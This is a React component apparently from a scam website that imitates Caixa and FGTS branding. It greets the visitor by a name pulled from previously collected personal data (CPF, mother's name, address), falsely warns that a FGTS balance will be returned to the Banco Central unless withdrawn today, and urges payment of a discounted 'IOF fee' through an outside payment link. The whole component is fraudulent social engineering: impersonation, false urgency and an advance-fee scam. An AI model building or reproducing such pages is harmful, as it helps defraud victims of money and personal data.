import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import pix from "../assets/pix.png";
import { IoIosWarning } from "react-icons/io";
import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";

export function BackRedirectDiscount() {
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const saqueTotal = 1739.70;

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        nomeMae: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        // Animação do valor aumentando gradualmente até o saque total
        const interval = setInterval(() => {
            setDisplayedAmount((prev) => (prev < saqueTotal ? prev + 50 : saqueTotal));
        }, 50);
        return () => clearInterval(interval);
    }, [saqueTotal]);

    return (
        <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
            <Helmet>
                <title>Pagamento com Desconto</title>
            </Helmet>

            {/* Cabeçalho com logotipo, saudação e logo FGTS */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="Logo Caixa" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="Logo FGTS" width={65} />
                </div>
            </header>

            {/* Conteúdo principal */}
            <main className="flex flex-col items-center justify-center text-center px-4 py-10 space-y-4">
                <h1 className="text-3xl font-bold text-gray-800">ESSA É SUA ÚLTIMA <br />OPORTUNIDADE</h1>

                <h2 className="text-xl  text-red-600">Caso não saque os rendimentos do FGTS hoje, o seu dinheiro será devolvido para o <span className="font-bold">Banco Central</span></h2>

                {/* Informações sobre o saque disponível */}
                <div>
                    <p className="text-2xl mb-2 text-gray-500 my-2">Valor disponível <br />para saque:</p>
                    <p className="text-6xl font-semibold text-green-500">R$ {displayedAmount.toFixed(2)}</p>
                </div>

                <div>
                    <p className="text-lg mb-2 text-orange-500 font-medium">Taxa de IOF para sacar o FGTS:</p>
                    <p className="text-2xl mb-2 text-zinc-400">DE: R$197,89</p>
                    <p className="text-4xl font-semibold text-primary">R$147,00</p>
                </div>

                {/* Botão de confirmação */}
                <a href="https://pay.pagamentofgt.shop/P5LNZ8qbbKQGaRy">
                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200">
                        PAGAR TAXA E SACAR MEU FGTS
                    </button>
                </a>

                {/* Sessão com imagem do Pix e mensagem de justificativa */}
                <div className="flex flex-col items-center space-y-4">
                    <img src={pix} alt="Logo Pix" className="w-20 mt-4 mb-4" />
                    <p className="text-sm text-gray-600">
                        <IoIosWarning className="inline mr-1 text-yellow-500" />
                        Aproveite o desconto na taxa para receber em <strong>até 3 minutos</strong> via Pix.
                    </p>
                    <p className="text-xs text-gray-500 max-w-md">
                        Este valor já inclui o desconto da taxa para recebimento imediato via Pix,
                        proporcionando uma alternativa rápida e segura ao saque convencional.
                    </p>
                </div>



            </main>
        </div>
    );
}
